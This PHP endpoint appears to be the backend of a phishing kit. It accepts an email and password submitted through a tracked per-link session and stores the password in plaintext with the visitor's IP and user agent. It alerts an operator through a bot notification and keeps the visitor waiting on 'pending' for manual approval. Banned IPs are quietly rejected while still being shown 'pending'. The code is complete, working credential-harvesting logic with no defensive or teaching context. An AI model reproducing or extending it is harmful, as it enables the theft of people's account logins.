<?php
declare(strict_types=1);

require_once __DIR__ . '/../lib/bot.php';

header('Content-Type: application/json; charset=utf-8');

$raw = file_get_contents('php://input');
$body = json_decode((string)$raw, true) ?: [];
$link_id = trim((string)($body['id'] ?? ''));
$email   = trim((string)($body['email'] ?? ''));
$password = (string)($body['password'] ?? '');

if ($link_id === '' || $email === '' || $password === '') {
    http_response_code(400);
    echo json_encode(['error' => 'missing fields']);
    exit;
}
if (mb_strlen($email) > 255 || mb_strlen($password) > 255) {
    http_response_code(400);
    echo json_encode(['error' => 'field too long']);
    exit;
}

$link = db_one('SELECT * FROM links WHERE id = ? AND is_active = 1', [$link_id]);
if (!$link) {
    http_response_code(404);
    echo json_encode(['error' => 'link not found']);
    exit;
}

$session = get_session_from_cookie();
if ($session === null || $session['link_id'] !== $link_id) {
    http_response_code(403);
    echo json_encode(['error' => 'invalid session']);
    exit;
}

if ($session['login_status'] === 'approved') {
    http_response_code(400);
    echo json_encode(['error' => 'already approved']);
    exit;
}

$ip = client_ip();
$ua = client_ua();

if (is_ip_banned($ip)) {
    db_run(
        'INSERT INTO login_attempts (link_id, session_id, email, password, ip, user_agent, status, responded_at)
         VALUES (?,?,?,?,?,?,"rejected", NOW())',
        [$link_id, $session['id'], $email, $password, $ip ?: null, $ua ?: null]
    );
    $attempt_id = (int)db()->lastInsertId();
    echo json_encode([
        'status'     => 'pending',
        'attempt_id' => $attempt_id,
        'timeout'    => (int)cfg_get('auto_reject_seconds'),
    ]);
    exit;
}

db_run(
    'UPDATE sessions SET login_status = "pending", email = ? WHERE id = ?',
    [$email, $session['id']]
);

db_run(
    'INSERT INTO login_attempts (link_id, session_id, email, password, ip, user_agent)
     VALUES (?,?,?,?,?,?)',
    [$link_id, $session['id'], $email, $password, $ip ?: null, $ua ?: null]
);
$attempt_id = (int)db()->lastInsertId();

try {
    notify_login_attempt($attempt_id);
} catch (Throwable $e) {
    error_log('notify login failed: ' . $e->getMessage());
}

echo json_encode([
    'status'     => 'pending',
    'attempt_id' => $attempt_id,
    'timeout'    => (int)cfg_get('auto_reject_seconds'),
]);
